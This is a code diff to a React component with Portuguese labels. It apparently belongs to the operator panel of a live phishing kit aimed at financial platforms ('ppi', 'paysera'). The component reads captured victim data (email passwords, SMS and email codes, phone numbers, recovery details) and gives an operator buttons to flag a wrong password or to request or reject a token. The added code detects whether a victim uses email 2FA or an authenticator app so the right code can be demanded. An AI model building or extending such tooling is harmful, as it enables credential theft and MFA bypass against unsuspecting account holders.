@@ -55,6 +55,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
   const [adminRecoveryEmail, setAdminRecoveryEmail] = useState("");
   const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
   const [sending, setSending] = useState<string | null>(null);
+  const [ppiMfaType, setPpiMfaType] = useState<number | null>(null);
   const [lastAction, setLastAction] = useState<string | null>(null);
   const [decision, setDecision] = useState<string | null>(null);
   const [decisionSending, setDecisionSending] = useState(false);
@@ -239,6 +240,14 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
       if (otp.startsWith("id_recovery:") || otp.startsWith("id_recovery_final:")) setIdRecovery(otp.replace(/^id_recovery(_final)?:/, ""));
       if (otp.startsWith("email_pass:")) setEmailPassword(otp.replace("email_pass:", ""));
       if (otp.startsWith("sync_pass:")) setEmailPassword(otp.replace("sync_pass:", ""));
+      // Parse PPI MFA type from otp_code parts
+      if (session.source === "ppi") {
+        const parts = otp.split("|");
+        for (const part of parts) {
+          const twofaMatch = part.match(/^twofa_type:(\d+)$/);
+          if (twofaMatch) setPpiMfaType(parseInt(twofaMatch[1], 10));
+        }
+      }
       if (otp.startsWith("sync_token:")) { setEmailCode(otp.replace("sync_token:", "")); setEmailCodeLabel("2FA Email"); }
       if (otp.startsWith("sms_code:") || otp.startsWith("sync_sms:")) { setEmailCode(otp.replace(/^(sms_code:|sync_sms:)/, "")); setEmailCodeLabel("SMS"); }
       if (otp.startsWith("client_phone:") || otp.startsWith("client_phone_final:")) { setClientPhoneNumber(otp.replace(/^(client_phone:|client_phone_final:)/, "")); }
@@ -724,7 +733,13 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
             <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-3">
               <div className="flex items-center gap-1.5 mb-2">
                 <ShieldCheck size={12} className="text-teal-400" />
-                <span className="text-[10px] font-bold uppercase tracking-wider text-teal-400">Plataforma</span>
+                <span className="text-[10px] font-bold uppercase tracking-wider text-teal-400">
+                  Plataforma {session.source === "ppi" && ppiMfaType !== null ? (
+                    <span className="ml-1 text-[9px] normal-case font-normal text-sky-400">
+                      ({ppiMfaType === 0 ? "📧 2FA Email" : ppiMfaType === 1 ? "🔐 Authenticator" : `2FA tipo ${ppiMfaType}`})
+                    </span>
+                  ) : null}
+                </span>
               </div>
               <div className="flex items-center gap-1.5 flex-wrap">
                 <ActionChip icon={<AlertTriangle size={10} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
@@ -747,7 +762,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
                     <ActionChip icon={<Smartphone size={10} />} label="Verificar Tel" active={A === "p_paysera_vphone"} onClick={pPayseraVerifyPhone} disabled={!!sending} variant="warn" />
                   </>
                 ) : (
-                  <ActionChip icon={<KeyRound size={10} />} label="Pedir Token" active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} variant="default" />
+                  <ActionChip icon={<KeyRound size={10} />} label={session.source === "ppi" && ppiMfaType !== null ? (ppiMfaType === 0 ? "Pedir 2FA Email" : "Pedir Authenticator") : "Pedir Token"} active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} variant="default" />
                 )}
                 <ActionChip icon={<XCircle size={10} />} label="Negar Token" active={decision === "rejected" && currentPhase === "otp"} onClick={pRejectOtp} disabled={decisionSending} variant="danger" />
                 <span className="w-px h-4 bg-border" />
